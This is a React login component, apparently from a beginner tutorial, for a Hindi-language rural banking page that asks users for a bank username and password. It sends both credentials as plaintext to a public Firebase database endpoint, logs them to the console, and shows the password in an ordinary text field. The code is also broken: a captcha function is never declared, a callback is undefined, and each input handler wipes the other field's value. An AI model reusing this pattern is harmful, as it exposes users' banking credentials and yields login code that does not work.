import React, { useState } from "react";
import "./Login.css";
import { configure } from "@testing-library/react";
import { getAuth, RecaptchaVerifier } from "firebase/auth";
import firebase from "../Fire/Firebase";
export default function LoginPage() {
  const [user, setUser] = useState({
    name: "",
    password: "",
  });
  let name, value;
  const getUserData = (event) => {
    name = event.target.name;
    value = event.target.value;

    setUser({ ...user, [name]: value });
  };
console.log("hey",user)

const postData = async(e) => {
e.preventDefault();

const{name,password} = user;

  const res  = await fetch("https://rural-banking-a8a02-default-rtdb.firebaseio.com/youtubereactform.json", {
  method: "POST",
  headers:{
    "content-Type":"application/json",
  },
  body:JSON.stringify({
    name,
    password,
  }),

  })
if(res){
  setUser({
    name:"",
    password:"",
  });
  alert("Done")
}

} ;

configureCaptcha = () => {
const auth = getAuth();
window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('sign-in-button', {
  'size': 'invisible',
  'callback': (response) => {
    // reCAPTCHA solved, allow signInWithPhoneNumber.
    onSignInSubmit();
  }
});

}

  return (
    <div>
      <p className="top">
        इस पेज पर आप अपने बैंक कहते की जानकारी क लिए लॉगिन करे अपना बलके चेक करे
        और किसी को भेजने ह वो भी भेज सकते ह अप्प निचे दिए बॉक्स में अपनी डिटेल्स
        दीजिये और फायदा{" "}
      </p>
      <form method="POST">
        <div className="container">
          <label for="name">username</label>
          <input
            className="top-1"
            type="text"
            value={user.name}
            onChange={(event) => {setUser({name:event.target.value})}}
            placeholder="username"
          ></input>
          <label for="password">password</label>
          <input
            className="top-1"
            type="text"
            value={user.password}
            onChange={(event) => {setUser({password:event.target.value})}}
            placeholder="password"
          ></input>
          <button className="bottom" type="submit" onClick={postData}>
            <div id="sign-in-button"></div>
            submit
          </button>
        </div>
      </form>
    </div>
  );
}
